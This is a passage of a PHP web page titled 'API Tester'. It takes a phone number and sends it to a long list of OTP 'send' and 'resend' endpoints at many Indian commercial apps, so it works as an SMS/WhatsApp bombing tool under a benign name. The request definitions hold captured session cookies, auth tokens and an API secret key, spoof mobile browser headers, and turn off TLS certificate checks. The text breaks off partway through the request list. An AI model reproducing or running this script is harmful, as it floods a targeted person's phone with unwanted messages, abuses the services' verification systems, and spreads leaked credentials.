<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Tester</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        .container {
            max-width: 800px;
            margin: auto;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .response {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            white-space: pre-wrap;
            background-color: #f9f9f9;
        }
        .response h4 {
            margin-top: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>API Tester</h2>
        <form method="GET" action="">
            <div class="form-group">
                <label for="mobile">Mobile Number:</label>
                <input type="text" id="mobile" name="mobile" value="<?php echo isset($_GET['mobile']) ? htmlspecialchars($_GET['mobile']) : '9685198958'; ?>" required>
            </div>
            <button type="submit">Submit</button>
        </form>

        <?php
        if (isset($_GET['mobile']) && !empty($_GET['mobile'])) {
            $mobile = htmlspecialchars($_GET['mobile']);
            // Sanitize mobile number (remove non-digits)
            $mobile = preg_replace('/[^0-9]/', '', $mobile);
            $mobile_with_plus = '+91' . $mobile; // For APIs requiring +91 prefix

            // Function to make HTTP requests
            function makeRequest($url, $method = 'GET', $headers = [], $data = null) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0); // Enable HTTP/2
                if ($data) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                }
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable for testing; enable in production
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $error = curl_error($ch);
                curl_close($ch);
                return [
                    'response' => $response,
                    'http_code' => $httpCode,
                    'error' => $error
                ];
            }

            // Array of all API requests
            $apis = [
                [
                    'url' => "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.penpencil.co",
                        "content-type: application/json; charset=utf-8",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/3.9.1"
                    ],
                    'data' => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile])
                ],
                [
                    'url' => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=$mobile",
                    'method' => 'GET',
                    'headers' => [
                        "Host: api.univest.in",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/3.9.1"
                    ],
                    'data' => null
                ],
                [
                    'url' => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
                    'method' => 'POST',
                    'headers' => [
                        "Host: services.mxgrability.rappi.com",
                        "content-type: application/json; charset=utf-8",
                        "accept-encoding: gzip",
                        "user-agent: okhttp/3.9.1"
                    ],
                    'data' => json_encode(["country_code" => "+91", "phone" => $mobile])
                ],
                [
                    'url' => "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
                    'method' => 'POST',
                    'headers' => [
                        "Host: xylem-api.penpencil.co",
                        "sec-ch-ua-platform: \"Android\"",
                        "authorization: Bearer",
                        "randomid: aac5f94e-bf2d-47de-8246-81e9a60e4b27",
                        "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                        "sec-ch-ua-mobile: ?1",
                        "client-type: WEB",
                        "client-id: 64254d66be2a390018e6d348",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.81 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "client-version: 300",
                        "origin: https://www.xylem.live",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: cross-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.xylem.live/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-IN,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "organizationId" => "64254d66be2a390018e6d348"])
                ],
                [
                    'url' => "https://www.limeroad.com/auth/resend_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: www.limeroad.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                        "sec-ch-ua-mobile: ?1",
                        "newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIwMjIwOSIsImFwIjoiOTM4OTkzIiwiaWQiOiIxOWRmNDFlOTIyY2E3ZDhlIiwidHIiOiIxNjhiZGEyYWJhMzY0YzUyNWQyYjNmOWY1YTczZWRiMCIsInRpIjoxNzM2MTc5MzIxMDE1fX0=",
                        "traceparent: 00-168bda2aba364c525d2b3f9f5a73edb0-19df41e922ca7d8e-01",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                        "content-type: application/json",
                        "tracestate: 202209@nr=0-1-202209-938993-19df41e922ca7d8e----1736179321015",
                        "accept: */*",
                        "origin: https://www.limeroad.com",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.limeroad.com/auth/login",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: a_n_u_a=1",
                        "cookie: _ruid=70e45bb5-ef00-4682-829e-84b41556a9e7",
                        "cookie: lrVr=v2",
                        "cookie: newCssOpt=v1",
                        "cookie: nH=1",
                        "cookie: navHeight=48",
                        "cookie: deviceWidth=360",
                        "cookie: deviceHeight=620",
                        "cookie: duid=984879601f523d60ea69b1dd961834ce",
                        "cookie: _gcl_au=1.1.875752135.1733885739",
                        "cookie: _ga=GA1.2.1573315999.1733885739",
                        "cookie: _fbp=fb.1.1733885741567.18659541388049364",
                        "cookie: _clck=19hkbpp%7C2%7Cfrm%7C0%7C1806",
                        "cookie: user_selected_gender=male",
                        "cookie: gender=M",
                        "cookie: mobile=$mobile",
                        "cookie: jr_token=true%3F%3Fee9437b8-56f1-444f-bcca-146e76e36ec6%3F%3Fjoulroad%3F%3F4831aa5c-c3bb-4202-9efb-00e7518eeaf2%3F%3FGuest",
                        "cookie: locale=hi",
                        "cookie: truecallerLogin=true",
                        "cookie: _session_id=2a93b3febf6911d924b2dd053298e1db",
                        "cookie: testCookie=v2",
                        "cookie: _gid=GA1.2.1657750549.1736179197",
                        "cookie: google_client_id=1573315999.1733885739",
                        "cookie: AWSALBTG=jXgPHl1qo/jLC5Qzmnk65zesLvDSS/pqa8AMcErdw3BJkIFXRaYiGpxFi8KwmV/ebJIpRMGEwt6x/m7Iu6W3wNM3+jYqSHMI9QD/ppkAwe8XAKejkB2ISvHi+i4BONe6Q3DuD45xFa6LfoO/v4bT3Up0T4sXjqmDA+8ITkNn7nXj",
                        "cookie: AWSALBTGCORS=jXgPHl1qo/jLC5Qzmnk65zesLvDSS/pqa8AMcErdw3BJkIFXRaYiGpxFi8KwmV/ebJIpRMGEwt6x/m7Iu6W3wNM3+jYqSHMI9QD/ppkAwe8XAKejkB2ISvHi+i4BONe6Q3DuD45xFa6LfoO/v4bT3Up0T4sXjqmDA+8ITkNn7nXj",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["user_id" => $mobile, "ruid" => "70e45bb5-ef00-4682-829e-84b41556a9e7"])
                ],
                [
                    'url' => "https://api.wakefit.co/api/consumer-sms-otp/",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.wakefit.co",
                        "api-secret-key: ycq55IbIjkLb",
                        "my-cookie: undefined",
                        "sec-ch-ua-platform: \"Android\"",
                        "api-token: c84d563b77441d784dce71323f69eb42",
                        "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                        "sec-ch-ua-mobile: ?1",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "origin: https://www.wakefit.co",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.wakefit.co/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "whatsapp_opt_in" => 1])
                ],
                [
                    'url' => "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api-gateway.juno.lenskart.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-api-client: AMAZON_IN",
                        "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                        "sec-ch-ua-mobile: ?1",
                        "x-session-token: 7836451c-4b02-4a00-bde1-15f7fb50312a",
                        "x-accept-language: en",
                        "x-b3-traceid: 991736185845136",
                        "x-country-code: IN",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                        "content-type: application/json",
                        "x-country-code-override: IN",
                        "accept: */*",
                        "origin: https://www.lenskart.com",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.lenskart.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["captcha" => null, "phoneCode" => "+91", "telephone" => $mobile])
                ],
                [
                    'url' => "https://www.shemaroome.com/users/resend_otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: www.shemaroome.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-requested-with: XMLHttpRequest",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                        "accept: */*",
                        "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "sec-ch-ua-mobile: ?1",
                        "origin: https://www.shemaroome.com",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.shemaroome.com/users/sign_in",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: _pk_id.1.e68e=1ddc9d91406c0a63.1733416698.",
                        "cookie: theme_option=dark_theme",
                        "cookie: user_sub_status=U2FsdGVkX1%2Bws%2Bg0YmKfdRAdqYdkkax%2FIcfgmnokzkE%3D",
                        "cookie: video_preview=U2FsdGVkX18oU731HnPMqOukoU5WoWnBFZLPFA71nRg%3D",
                        "cookie: is_premium=U2FsdGVkX1%2FjsKmrvy%2BwhWApFMpQXBWxLtsjZOQQsQc%3D",
                        "cookie: user_preview_played_status=U2FsdGVkX195j7pKuvMY%2BBqzB%2BI9h67VuOxH%2F1wNAds%3D",
                        "cookie: preview_available=U2FsdGVkX1%2BoThTW%2FiW32TQmFu0FNRHi03%2BvNgeY3MY%3D",
                        "cookie: external_preview_url=U2FsdGVkX18x7trPwMAOHl3bf08h87ebylm9UTXpAEY%3D",
                        "cookie: contentid_user_id_sub_status=U2FsdGVkX1%2FxQCYAOxqCFR92%2BDuwC%2BMtrPdEWLVBxME%3D",
                        "cookie: user_ip=",
                        "priority: u=1, i"
                    ],
                    'data' => "mobile_no=$mobile_with_plus"
                ],
                [
                    'url' => "https://www.jockey.in/apps/jotp/api/login/resend-otp/$mobile_with_plus?whatsapp=true",
                    'method' => 'GET',
                    'headers' => [
                        "Host: www.jockey.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                        "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                        "sec-ch-ua-mobile: ?1",
                        "accept: */*",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.jockey.in/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: secure_customer_sig=",
                        "cookie: localization=IN",
                        "cookie: _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D",
                        "cookie: _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4",
                        "cookie: wishlist_id=7531056362767gn1bc6na3",
                        "cookie: bookmarkeditems={\"items\":[]}",
                        "cookie: wishlist_customer_id=0",
                        "cookie: _orig_referrer=",
                        "cookie: _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7",
                        "cookie: _shopify_sa_p=",
                        "cookie: cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%3D38a52d30f4363b9ee4e8ffea783532bb",
                        "cookie: keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234",
                        "cookie: cart_ts=1736192207",
                        "cookie: cart_sig=04c8cecd093ed714d4a4dd68dfcc4020",
                        "cookie: cart_currency=INR",
                        "cookie: _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed",
                        "cookie: _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z",
                        "priority: u=1, i"
                    ],
                    'data' => null
                ],
                [
                    'url' => "https://web.pocketfm.com/send_otp/?phone_number=$mobile_with_plus&country_code=%2B91",
                    'method' => 'POST',
                    'headers' => [
                        "Host: web.pocketfm.com",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36",
                        "sec-ch-ua-platform: \"Android\"",
                        "app-client: consumer-web",
                        "sec-ch-ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Android WebView\";v=\"132\"",
                        "auth-token: web-auth",
                        "sec-ch-ua-mobile: ?1",
                        "app-version: 180",
                        "device-id: mobile-web",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "locale: IN",
                        "platform: web",
                        "origin: https://www.pocketfm.com",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["locale" => "IN", "device_id" => "56299bc89bc89bc86af89bc86af838ef74d5289b", "platform" => "web"])
                ],
                [
                    'url' => "https://www.caratlane.com/cg/dhevudu",
                    'method' => 'POST',
                    'headers' => [
                        "Host: www.caratlane.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "authorization: f4ab19f9682677d6b714f22c1637ea88d6be3812352cbe4a9e91b6ac4e3dc4",
                        "sec-ch-ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Android WebView\";v=\"132\"",
                        "x-authorization: f4ab19f9682677d6b714f22c1637ea88d6be3812352cbe4a9e91b6ac4e3dc4",
                        "x-amzn-trace-id: uniqid=40599x54m429upya-1738407738888",
                        "sec-ch-ua-mobile: ?1",
                        "setsamesite: true",
                        "ib: false",
                        "uniqid: 40599x54m429upya-1738407738888",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "cs-request: true",
                        "content-type: application/json",
                        "cookieenabled: true",
                        "origin: https://www.caratlane.com",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-origin",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.caratlane.com/login",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: rb_uid=40599x54m429upya",
                        "cookie: showHighlightForRecentlyViewedStoreLink=true",
                        "cookie: G_ENABLED_IDPS=google",
                        "cookie: nitrox=6de89fc1-2a23-4d95-a64a-3fd743623d1a",
                        "cookie: locale=en_IN",
                        "cookie: BP=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQwNTlhMGhtNWxjNTV2aiIsImV4cCI6MTc0MTAyNjU5OSwiaWF0IjoxNzM4NDA3NjU2LCJhdWQiOiJXZWIiLCJpc3MiOiJDYXJhdGxhbmUifQ.o8IN5pTaNLyoBWIQYSFLKxk9QK8TGpY-FGi0K_1UFAHr2rQcDr2JKQSPTCg5ma_gnVQMB1buwE2RutFpb8c4_BSVyUcwAk0HYn5bBpRrabVupRdFQ8-zu7jmcD9qmzFi4uPYQ7JxdSLoXcUENus5QkU-ipxg7qsjDF5yZ-L3mA4gjcTSutFiMp1octwG3lXImcxX62WgTN7lTIWn2meUd747C_roVESmtVosXkYBhAKEQt4IxnmlqyIuhMRwHTP5w37yn_-6TsWcyXftDFPH5bZDzldgcB_OMsFvDJQQaUzeeMJcbDBwKAYXtyM4CqSbFAb92XEfTihFwFrlxQ2Arg",
                        "cookie: JCN=f4ab19f9682677d6b714f22c1637ea88d6be3812352cbe4a9e91b6ac4e3dc4",
                        "cookie: vt_bp=true",
                        "cookie: SABC=default_mobile",
                        "cookie: LP_PV=P2",
                        "cookie: tourShown=true",
                        "cookie: g_state={\"i_p\":1738414883737,\"i_l\":1}",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode([
                        "query" => "mutation SendOtp(\$mobile:String, \$isdCode:String, \$otpType:String, \$email:String){\n  SendOtp(input:{mobile:\$mobile, isdCode:\$isdCode, otpType:\$otpType, email:\$email}){\n          status{\n              message\n              code\n          }\n      }\n  }\n",
                        "variables" => ["mobile" => $mobile, "isdCode" => "91", "otpType" => "registerOtp"]
                    ])
                ],
                [
                    'url' => "https://next-api.airpaz.com/v2/member/request-signup",
                    'method' => 'POST',
                    'headers' => [
                        "Host: next-api.airpaz.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "x-csrf-token: ZmI0Y2ZkNTliZmMwZGZmYjM3MWUyM2JjYTRmOGJiZjU=",
                        "sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
                        "x-ref-src: DIRECT",
                        "sec-ch-ua-mobile: ?1",
                        "x-source: GADS",
                        "x-sourcepar: eyJzIjoiR0FEUyIsImEiOiIyMTM0MDE0MTMyMiIsImIiOiIiLCJtIjpudWxsLCJwIjoiIiwiayI6bnVsbCwiYyI6bnVsbCwiZCI6Im0iLCJkbSI6bnVsbCwidCI6IiIsIm4iOiJ4IiwiZGYiOm51bGwsInUiOm51bGwsImwiOiI5MzAyNDgwIn0=",
                        "x-trace-id: TO8BsF0ykTMfxTEEW9",
                        "x-auid: 4bf99c56-12c5-47ac-a9fb-cd43cc8ea07c",
                        "x-kn: Qkl3MHB2c20yak4=",
                        "accept: application/json",
                        "content-type: application/json",
                        "x-session-id: 4666de15-38b0-42c1-a985-fca4a1d7b2e2",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.39 Mobile Safari/537.36",
                        "origin: https://www.airpaz.com",
                        "x-requested-with: pure.lite.browser",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://www.airpaz.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "mobileCode" => "IN", "lang" => "en"])
                ],
                [
                    'url' => "https://force.eazydiner.com/4.1/otp?medium=android",
                    'method' => 'POST',
                    'headers' => [
                        "Authorization: Bearer",
                        "Screen-Width: 1080",
                        "Build: 371",
                        "Medium: Android",
                        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
                        "Host: force.eazydiner.com",
                        "Connection: Keep-Alive",
                        "Accept-Encoding: gzip"
                    ],
                    'data' => "mobile=$mobile_with_plus&whatsapp=1&"
                ],
                [
                    'url' => "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: customerapp-gateway.porter.in",
                        "host_type: CAG",
                        "country: in",
                        "preferred-languages: {\"app_language\":\"en\"}",
                        "brand: porter",
                        "source: android",
                        "version-name: 6.32.0",
                        "custom-app-version-code: 535",
                        "client-request-uuid: 707ef625-2194-45e7-8d38-4332dfd0ea04",
                        "installation-id: adfb2f75-4863-42dc-bebb-ea8ad1e38cf1",
                        "app-session-id: 84c8f740-0023-4374-870c-fa30c4b6dda7",
                        "user-agent: com.theporter.android.customerapp/6.32.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
                        "accept-charset: UTF-8",
                        "accept: */*",
                        "content-type: application/json",
                        "accept-encoding: gzip"
                    ],
                    'data' => json_encode(["mobile" => $mobile])
                ],
                [
                    'url' => "https://here.co.in/users/v1/customer-portal/send-otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: here.co.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "cache-control: no-cache",
                        "x-app-version-code: 182",
                        "x-api-client: Website",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "sec-ch-ua-mobile: ?1",
                        "x-origin: https://sh.hdfcergo.com",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "origin: https://www.hdfcergo.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: cross-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "sec-fetch-storage-access: active",
                        "referer: https://www.hdfcergo.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "countryCodeId" => "b43569eb-6798-43fb-8d27-47d55d7c544b", "source" => "sms"])
                ],
                [
                    'url' => "https://here.co.in/users/v1/customer-portal/send-otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: here.co.in",
                        "sec-ch-ua-platform: \"Android\"",
                        "cache-control: no-cache",
                        "x-app-version-code: 182",
                        "x-api-client: Website",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "sec-ch-ua-mobile: ?1",
                        "x-origin: https://sh.hdfcergo.com",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "origin: https://www.hdfcergo.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: cross-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "sec-fetch-storage-access: active",
                        "referer: https://www.hdfcergo.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["mobile" => $mobile, "countryCodeId" => "b43569eb-6798-43fb-8d27-47d55d7c544b", "source" => "whatsapp"])
                ],
                [
                    'url' => "https://api.manmatters.com/portal/auth/send-otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.manmatters.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "sec-ch-ua-mobile: ?1",
                        "repeatuser: false",
                        "mwlang: en",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "origin: https://manmatters.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://manmatters.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                        "cookie: mp_622d6bf65dcee1d7e8534dc052770bdf_mixpanel=%7B%22distinct_id%22%3A%22%24device%3A450426a4-60f7-4122-b527-a3fdf4672140%22%2C%22%24device_id%22%3A%22450426a4-60f7-4122-b527-a3fdf4672140%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fl.wl.co%2F%22%2C%22%24initial_referring_domain%22%3A%22l.wl.co%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fl.wl.co%2F%22%2C%22%24initial_referring_domain%22%3A%22l.wl.co%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D",
                        "cookie: mwut=aeabc47d-5e73-4e9d-94cc-7284d55458f2",
                        "priority: u=1, i"
                    ],
                    'data' => json_encode(["phoneNumber" => $mobile, "source" => "", "resend" => false])
                ],
                [
                    'url' => "https://api.manmatters.com/portal/auth/send-otp",
                    'method' => 'POST',
                    'headers' => [
                        "Host: api.manmatters.com",
                        "sec-ch-ua-platform: \"Android\"",
                        "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                        "sec-ch-ua-mobile: ?1",
                        "repeatuser: false",
                        "mwlang: en",
                        "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                        "accept: application/json, text/plain, */*",
                        "content-type: application/json",
                        "origin: https://manmatters.com",
                        "x-requested-with: mark.via.gp",
                        "sec-fetch-site: same-site",
                        "sec-fetch-mode: cors",
                        "sec-fetch-dest: empty",
                        "referer: https://manmatters.com/",
                        "accept-encoding: gzip, deflate, br, zstd",
                        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
